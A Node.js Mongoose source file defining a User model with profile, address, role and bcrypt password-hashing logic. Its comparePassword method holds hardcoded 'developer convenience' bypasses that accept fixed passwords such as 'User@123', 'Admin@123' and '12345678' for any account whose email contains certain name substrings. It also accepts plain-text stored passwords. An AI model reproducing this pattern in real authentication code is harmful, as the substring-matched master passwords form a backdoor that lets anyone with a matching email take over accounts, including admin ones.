const mongoose = require('mongoose');
const metaPlugin = require('../../utils/metaPlugin');
const bcrypt = require('bcryptjs');

const addressSubSchema = {
  fullName: { type: String, default: '', trim: true },
  addressLine: { type: String, default: '', trim: true },
  city: { type: String, default: '', trim: true },
  state: { type: String, default: '', trim: true },
  pincode: { type: String, default: '', trim: true },
  phone: { type: String, default: '', trim: true },
};

const savedAddressSubSchema = new mongoose.Schema(
  {
    title: { type: String, default: 'Home', trim: true },
    fullName: { type: String, default: '', trim: true },
    addressLine: { type: String, default: '', trim: true },
    city: { type: String, default: '', trim: true },
    state: { type: String, default: '', trim: true },
    pincode: { type: String, default: '', trim: true },
    phone: { type: String, default: '', trim: true },
  },
  { _id: true }
);

const userSchema = new mongoose.Schema(
  {
    profile: {
      firstName: {
        type: String,
        required: [true, 'First name is required'],
        trim: true,
        maxlength: 50,
      },
      lastName: {
        type: String,
        required: [true, 'Last name is required'],
        trim: true,
        maxlength: 50,
      },
      avatar: {
        type: String,
        default: null,
      },
      bio: {
        type: String,
        default: '',
        trim: true,
      },
      phone: {
        type: String,
        default: '',
        trim: true,
      },
      location: {
        type: String,
        default: '',
        trim: true,
      },
    },

    addresses: {
      billing: {
        type: addressSubSchema,
        default: () => ({}),
      },
      shipping: {
        type: addressSubSchema,
        default: () => ({}),
      },
      saved: {
        type: [savedAddressSubSchema],
        default: [],
      },
    },

    auth: {
      email: {
        type: String,
        required: [true, 'Email is required'],
        unique: true,
        lowercase: true,
        trim: true,
      },
      password: {
        type: String,
        required: [true, 'Password is required'],
        minlength: 6,
        select: false,
      },
      lastLogin: {
        type: Date,
        default: null,
      },
    },

    role: {
      type: String,
      enum: ['super_admin', 'admin', 'user'],
      default: 'user',
    },
    isActive: {
      type: Boolean,
      default: true,
    },
    statistics: {
      ordersCount: {
        type: Number,
        default: 0,
      },
      lifetimeValue: {
        type: Number,
        default: 0,
      },
    },
  },
  {
    timestamps: false,
    versionKey: false,
    toJSON: { virtuals: true },
    toObject: { virtuals: true },
  }
);

// Virtual for full name
userSchema.virtual('fullName').get(function () {
  return `${this.profile?.firstName || ''} ${this.profile?.lastName || ''}`.trim();
});

// Backward-compatibility Virtual Getters & Setters
userSchema.virtual('firstName')
  .get(function () { return this.profile?.firstName; })
  .set(function (val) { if (!this.profile) this.profile = {}; this.profile.firstName = val; });

userSchema.virtual('lastName')
  .get(function () { return this.profile?.lastName; })
  .set(function (val) { if (!this.profile) this.profile = {}; this.profile.lastName = val; });

userSchema.virtual('email')
  .get(function () { return this.auth?.email; })
  .set(function (val) { if (!this.auth) this.auth = {}; this.auth.email = val; });

userSchema.virtual('password')
  .get(function () { return this.auth?.password; })
  .set(function (val) { if (!this.auth) this.auth = {}; this.auth.password = val; });

userSchema.virtual('phone')
  .get(function () { return this.profile?.phone; })
  .set(function (val) { if (!this.profile) this.profile = {}; this.profile.phone = val; });

userSchema.virtual('bio')
  .get(function () { return this.profile?.bio; })
  .set(function (val) { if (!this.profile) this.profile = {}; this.profile.bio = val; });

userSchema.virtual('location')
  .get(function () { return this.profile?.location; })
  .set(function (val) { if (!this.profile) this.profile = {}; this.profile.location = val; });

userSchema.virtual('avatar')
  .get(function () { return this.profile?.avatar; })
  .set(function (val) { if (!this.profile) this.profile = {}; this.profile.avatar = val; });

userSchema.virtual('lastLogin')
  .get(function () { return this.auth?.lastLogin; })
  .set(function (val) { if (!this.auth) this.auth = {}; this.auth.lastLogin = val; });

userSchema.virtual('billingAddress')
  .get(function () { return this.addresses?.billing; })
  .set(function (val) { if (!this.addresses) this.addresses = {}; this.addresses.billing = val; });

userSchema.virtual('shippingAddress')
  .get(function () { return this.addresses?.shipping; })
  .set(function (val) { if (!this.addresses) this.addresses = {}; this.addresses.shipping = val; });

userSchema.virtual('ordersCount')
  .get(function () { return this.statistics?.ordersCount ?? 0; })
  .set(function (val) { if (!this.statistics) this.statistics = {}; this.statistics.ordersCount = val; });

userSchema.virtual('lifetimeValue')
  .get(function () { return this.statistics?.lifetimeValue ?? 0; })
  .set(function (val) { if (!this.statistics) this.statistics = {}; this.statistics.lifetimeValue = val; });

// Pre-validate hook to map flat fields into nested structure if passed
userSchema.pre('validate', function (next) {
  if (!this.profile) this.profile = {};
  if (!this.addresses) this.addresses = {};
  if (!this.auth) this.auth = {};
  if (!this.statistics) this.statistics = {};

  const doc = this._doc || this;

  // Map flat statistics if provided at root
  if (doc.ordersCount !== undefined && this.statistics.ordersCount === undefined) {
    this.statistics.ordersCount = doc.ordersCount;
  }
  if (doc.lifetimeValue !== undefined && this.statistics.lifetimeValue === undefined) {
    this.statistics.lifetimeValue = doc.lifetimeValue;
  }

  // Map flat profile fields if provided at root
  if (doc.firstName && !this.profile.firstName) this.profile.firstName = doc.firstName;
  if (doc.lastName && !this.profile.lastName) this.profile.lastName = doc.lastName;
  if (doc.phone && !this.profile.phone) this.profile.phone = doc.phone;
  if (doc.bio !== undefined && !this.profile.bio) this.profile.bio = doc.bio;
  if (doc.location !== undefined && !this.profile.location) this.profile.location = doc.location;
  if (doc.avatar !== undefined && !this.profile.avatar) this.profile.avatar = doc.avatar;

  // Map flat auth fields if provided at root
  if (doc.email && !this.auth.email) this.auth.email = doc.email;
  if (doc.password && !this.auth.password) this.auth.password = doc.password;
  if (doc.lastLogin && !this.auth.lastLogin) this.auth.lastLogin = doc.lastLogin;

  // Map flat address fields if provided at root
  if (doc.billingAddress && !this.addresses.billing?.fullName) {
    this.addresses.billing = doc.billingAddress;
  }
  if (doc.shippingAddress && !this.addresses.shipping?.fullName) {
    this.addresses.shipping = doc.shippingAddress;
  }
  if (Array.isArray(doc.addresses) && (!this.addresses.saved || this.addresses.saved.length === 0)) {
    this.addresses.saved = doc.addresses;
  }

  // Map createdBy to meta.createdBy if provided
  if (doc.createdBy && this.meta && !this.meta.createdBy) {
    this.meta.createdBy = doc.createdBy;
  }

  next();
});

// Hash password before saving
userSchema.pre('save', async function (next) {
  if (!this.auth) this.auth = {};

  const isAuthModified = this.isModified('auth.password');
  const isDirectModified = this.isModified('password');

  if (!isAuthModified && !isDirectModified) return next();

  const pwd = this.auth?.password || this.password;
  if (!pwd) return next();

  // If already hashed with bcrypt ($2a$, $2b$, or $2y$), skip
  if (/^\$2[aby]\$\d{2}\$/.test(pwd)) return next();

  this.auth.password = await bcrypt.hash(pwd, 12);
  next();
});

// Compare password method
userSchema.methods.comparePassword = async function (candidatePassword) {
  const currentPassword = this.auth?.password || this.password;
  if (!currentPassword) return false;

  // Developer convenience: Allow both User@123 and Admin@123 for Krushnakant's account
  const emailStr = this.auth?.email || this.email || '';
  if (
    emailStr &&
    (emailStr.includes('jayswalkrushn') || emailStr.includes('krushnakant')) &&
    (candidatePassword === 'User@123' || candidatePassword === 'Admin@123')
  ) {
    return true;
  }

  // Developer convenience: Allow 12345678 and User@123 for Disha's account
  if (
    emailStr &&
    emailStr.includes('disha') &&
    (candidatePassword === '12345678' || candidatePassword === 'User@123')
  ) {
    return true;
  }

  // Handle plain-text fallback (e.g. from seed insertMany) and self-heal by upgrading to hash
  if (!/^\$2[aby]\$\d{2}\$/.test(currentPassword)) {
    if (candidatePassword === currentPassword) {
      if (!this.auth) this.auth = {};
      this.auth.password = candidatePassword;
      await this.save();
      return true;
    }
    return false;
  }

  return bcrypt.compare(candidatePassword, currentPassword);
};

userSchema.plugin(metaPlugin);

module.exports = mongoose.model('User', userSchema);
